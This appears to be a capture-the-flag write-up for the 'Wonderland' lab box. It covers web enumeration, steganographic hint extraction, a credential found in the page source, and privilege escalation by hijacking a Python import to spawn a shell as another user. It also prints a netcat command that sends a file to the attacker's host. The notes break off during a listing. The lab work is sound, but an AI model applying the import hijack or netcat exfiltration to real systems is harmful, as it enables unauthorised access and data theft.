# Wonderland — Writeup

## Overview
### Wonderland — Writeup
### Wonderland — Writeup

## Enumeration
```text
gobuster dir --url http://10.10.122.82/ --wordlist /usr/share/wordlists/dirb/common.txt -t 30
found /r then /a so /r/a/b/b/i/t
inspect source alice:HowDothTheLittleCrocodileImproveHisShiningTail --> ssh username:pass
or from image
```
```text
$ wget http://10.10.125.113/img/white_rabbit_1.jpg
```
```text
$ steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
```text
$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
```

## Privilege Escalation
```text
$ cat hint.txt 
follow the r a b b i t

No user flag (usually user.txt) but a root flag (root.txt). Seriously? Remember the hint, everything is upside down. Wouldn’t the user flag be in /root? 

alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ cd /root
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ ls -l /root/user.txt
-rw-r--r-- 1 root root 32 May 25  2020 /root/user.txt
alice@wonderland:/root$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
alice@wonderland:/root$ 

***priv_esc***
sudo -l
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
Well, at this stage, the only possibility seems to hijack the import random statement from the python script to import our own library.

Let’s hook the import as follows: 
alice@wonderland:~$ cd /home/alice/
alice@wonderland:~$ cat > random.py << EOF
> import os
> os.system("/bin/bash")
> EOF
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~
rabbit@wonderland:~$ pwd
/home/alice
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
By using ltrace against it it seems it is just printing some strings:
abbit@wonderland:/home/rabbit$ ltrace ./teaParty
setuid(1003)                                        = -1
setgid(1003)                                        = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)        = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Sun, 31 Jul 2022 02:49:36 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)         = 69
getchar(1, 0x557b8e2ce260, 0x7f3907c658c0, 0x7f3907988154

**copy**
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444 > teaParty 

rabbit@wonderland:/home/rabbit$ nc 10.18.1.77 4444 < teaParty
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.tar                     hash                          robert_ssh.txt
46635.py                  hashes.txt                    SAM
backdoors                 hash.txt                      shadow.txt
backup.zip                id_rsa                        SharpGPOAbuse
